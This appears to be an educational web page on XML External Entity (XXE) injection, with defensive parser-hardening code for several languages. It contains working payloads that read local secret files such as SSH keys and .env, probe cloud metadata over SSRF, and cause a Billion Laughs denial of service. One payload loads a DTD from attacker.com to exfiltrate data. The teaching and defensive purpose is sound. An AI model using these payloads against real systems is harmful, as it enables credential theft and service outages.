XML External Entity Injection (XXE)

OWASP Top 10 · A05 Security Misconfiguration / A03 Injection · CWE-611

XML supports a feature called External Entities — a way to define a variable whose value is pulled from an external file or URL. XXE exploits this to make the server read local files, probe internal networks, or perform SSRF, simply by sending crafted XML.

Craft an XML payload and see how a vulnerable parser responds vs. a hardened one with external entities disabled.

XML Payload
Presets:
❌ Vulnerable parser — entities enabled
✅ Hardened parser — entities disabled
① File disclosureCritical

Read any file the server process has permission to access — secrets, credentials, SSH keys, source code.

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> <!ENTITY env SYSTEM "file:///app/.env"> <!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"> ]> <data>&xxe;</data>
Parser substitutes &xxe; with the raw file content, which is then returned in the response body.
② SSRF — internal network probingHigh

Use HTTP/HTTPS URIs to make the server fetch internal services unreachable from the internet — cloud metadata endpoints, internal APIs, databases.

<!DOCTYPE foo [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/"> <!ENTITY redis SYSTEM "http://10.0.0.5:6379/"> ]> <data>&ssrf;</data>
169.254.169.254 is the AWS EC2 metadata endpoint — returns IAM credentials, instance info, and more.
③ Billion Laughs — DoSMedium

Entities that reference other entities — exponential expansion. A tiny payload expands to gigabytes in memory, crashing the parser.

<!DOCTYPE bomb [ <!ENTITY a "lol"> <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"> <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"> <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"> ]> <data>&d;</data> <!-- "lol" × 10³ = 1000 chars from 4 entities -->
④ Parameter entity — DTD injectionAdvanced

Parameter entities (prefixed with %) allow dynamic DTD construction and are used for blind XXE exfiltration when direct output isn't reflected.

<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]> <data>test</data> <!-- evil.dtd on attacker's server exfiltrates %file; -->
⑤ XInclude — no DOCTYPE neededBypass technique

When you can't control the DOCTYPE (e.g. server wraps your input in XML), use XInclude to read files without a DTD declaration.

<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/> </foo>

Blind XXE occurs when the server processes your XML but does not return the parsed entity content in the response. You need an out-of-band channel to exfiltrate data.

Detection techniques for blind XXE
1
DNS exfiltration
Use SYSTEM "http://your-collaborator.com" — even if no data returns, a DNS lookup to your server confirms the parser is resolving external entities. Burp Collaborator automates this.
2
Error-based exfiltration
Reference a non-existent file using a filename built from the secret data. The parser's error message leaks the content: file:///nonexistent/root:x:0:0 → error reveals the path.
3
Time-based (response delay)
Point the entity to a slow external server. A delayed response confirms outbound HTTP is allowed, even if data isn't returned.
① Disable external entities in your XML parser First line of defense
Every major XML library has a way to disable external entity resolution. This is the single most important fix — and it requires zero application-logic changes.
// Java (DocumentBuilderFactory) DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); dbf.setFeature("http://xml.org/sax/features/external-general-entities", false); dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false); dbf.setXIncludeAware(false); dbf.setExpandEntityReferences(false); // Python (lxml) from lxml import etree parser = etree.XMLParser(resolve_entities=False, no_network=True) tree = etree.parse(xml_input, parser) // PHP (libxml) libxml_disable_entity_loader(true); // PHP < 8.0 // PHP 8.0+ — external entities disabled by default // Node.js (node-expat / sax) // Use sax with { strictEntities: true } // Or use fast-xml-parser with { allowBooleanAttributes: false } // .NET XmlReaderSettings settings = new XmlReaderSettings(); settings.DtdProcessing = DtdProcessing.Prohibit; XmlReader reader = XmlReader.Create(stream, settings);
② Use a less dangerous data format Architectural
If your API doesn't need XML, switch to JSON. JSON has no concept of entities, DTDs, or external resource loading — the entire XXE attack surface disappears.
// Instead of parsing XML POSTed by clients, accept JSON: app.use(express.json()); // JSON.parse() has no entity expansion — XXE is structurally impossible
③ Allowlist / validate XML structure Defense in depth
If you must accept XML, validate it against a strict XSD schema before parsing. Reject any payload containing a DOCTYPE declaration.
// Quick DOCTYPE check before parsing function isSafeXML(xmlString) { if (/<!DOCTYPE/i.test(xmlString)) { throw new Error('DOCTYPE not allowed'); } return true; } // Python — reject DOCTYPE at string level import re if re.search(r'<!DOCTYPE', xml_input, re.IGNORECASE): raise ValueError("DOCTYPE declarations are not permitted")
④ SSRF protection — restrict outbound HTTP Complementary
Even if XXE is exploited, blocking outbound HTTP/DNS from your app server limits the blast radius — attackers can't reach cloud metadata endpoints or internal services.
⑤ Hidden XXE surfaces to audit
DOCX / XLSX / SVG uploads — all are ZIP archives containing XML  ·  SAML authentication — uses XML signatures  ·  RSS / Atom feeds  ·  PDF generators that accept SVG input  ·  SOAP web services  ·  Any endpoint accepting Content-Type: application/xml or text/xml
